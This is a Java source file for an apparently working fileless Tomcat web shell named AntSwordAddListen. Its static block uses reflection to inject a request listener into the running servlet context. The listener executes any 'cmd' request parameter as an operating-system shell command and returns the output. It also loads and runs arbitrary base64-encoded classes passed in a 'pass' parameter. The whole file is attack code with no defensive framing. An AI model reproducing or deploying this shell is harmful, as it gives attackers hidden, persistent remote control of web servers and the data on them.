import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Field;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.util.Scanner;


public class AntSwordAddListen extends ClassLoader implements ServletRequestListener {

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ClassLoader z = null;
            AntSwordAddListen servletRequestListener = new AntSwordAddListen(z);
            Method listener = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addApplicationEventListener", Object.class);
            listener.invoke(standardContext,servletRequestListener);

        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("AntSwordAddListen Start ......");
        try {
            System.out.println("Do Listener ......");
            // 获取request和response对象
            RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            Response response = request.getResponse();
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            // AntSword MemShell
            String Pwd = "pass";
            String cls = request.getParameter(Pwd);
            if (cls != null) {
                (new AntSwordAddListen(getClass().getClassLoader())).g(base64Decode(cls)).newInstance().equals(new Object[] { request, response });
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public AntSwordAddListen(ClassLoader z) {
        super(z);
    }

    public Class g(byte[] b) {
        return defineClass(b, 0, b.length);
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", new Class[] { String.class }).invoke(clazz.newInstance(), new Object[] { str });
        } catch (Exception e) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        }
    }
}